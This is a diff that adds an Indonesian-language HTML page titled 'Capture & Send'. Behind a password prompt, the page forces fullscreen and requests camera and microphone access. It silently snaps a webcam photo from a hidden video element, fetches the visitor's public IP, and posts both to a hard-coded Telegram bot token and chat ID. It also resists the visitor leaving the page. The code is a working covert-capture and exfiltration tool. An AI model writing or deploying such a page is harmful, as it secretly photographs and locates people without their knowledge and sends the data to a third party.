@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Capture & Send</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow: hidden;
+      background-color: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+    #passwordPrompt {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 24px;
+      text-align: center;
+      display: none;
+    }
+    #passwordInput {
+      padding: 10px;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+    #video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="passwordPrompt">
+    <div>
+      <p>Masukkan Password untuk Melanjutkan:</p>
+      <input type="password" id="passwordInput" />
+      <button onclick="checkPassword()">Submit</button>
+    </div>
+  </div>
+
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = '7791336064:AAHBFAKs7konFgbmryQMIyJdOYJvILsu5Ns';
+    const CHAT_ID = '7700993337';
+    const correctPassword = "12345"; // Ganti dengan password yang diinginkan
+
+    // Fungsi untuk menampilkan prompt password
+    function showPasswordPrompt() {
+      document.getElementById('passwordPrompt').style.display = 'flex';
+    }
+
+    // Cek apakah password yang dimasukkan benar
+    function checkPassword() {
+      const passwordInput = document.getElementById('passwordInput').value;
+      if (passwordInput === correctPassword) {
+        document.getElementById('passwordPrompt').style.display = 'none';
+        goFullscreen();  // Masuk fullscreen setelah password benar
+        init();  // Mulai fungsionalitas aplikasi
+      } else {
+        alert("Password salah!");
+      }
+    }
+
+    // Fungsi untuk memaksa aplikasi masuk fullscreen
+    function goFullscreen() {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+        document.documentElement.mozRequestFullScreen();
+      } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        document.documentElement.webkitRequestFullscreen();
+      } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+        document.documentElement.msRequestFullscreen();
+      }
+    }
+
+    // Fungsi untuk mengakses kamera dan mengirim foto
+    async function getPublicIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Tidak diketahui";
+      }
+    }
+
+    async function sendPhotoAndInfo(videoStream) {
+      const video = document.getElementById('video');
+      video.srcObject = videoStream;
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          video.play();
+          resolve();
+        };
+      });
+
+      await new Promise(r => setTimeout(r, 500));
+
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+      const ip = await getPublicIP();
+      const time = new Date().toLocaleString();
+      const caption = `
+IP: ${ip}
+Waktu: ${time}
+`.trim();
+
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'photo.jpg');
+      formData.append('caption', caption);
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: true
+        });
+
+        await sendPhotoAndInfo(stream);
+      } catch (err) {
+        alert("Gagal mengakses media: " + err.message);
+      }
+    }
+
+    // Mencegah pengguna meninggalkan halaman
+    window.addEventListener('beforeunload', function (e) {
+      e.preventDefault();
+      e.returnValue = '';  // Browser akan menampilkan dialog konfirmasi
+    });
+
+    // Menampilkan password prompt saat halaman dimuat
+    window.onload = showPasswordPrompt;
+  </script>
+</body>
+</html>
